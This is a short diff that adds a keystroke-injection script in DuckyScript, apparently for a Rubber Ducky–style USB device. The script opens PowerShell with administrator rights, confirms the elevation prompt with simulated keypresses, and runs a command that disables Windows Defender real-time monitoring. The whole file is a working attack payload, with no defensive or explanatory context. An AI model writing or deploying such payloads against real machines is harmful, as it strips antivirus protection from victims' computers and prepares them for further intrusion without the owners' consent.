@@ -1,0 +1,9 @@
+DEFAULT_DELAY 500
+DELAY 10000
+CTRL ESC
+STRING powershell
+CTRL-SHIFT ENTER
+LEFTARROW
+ENTER
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
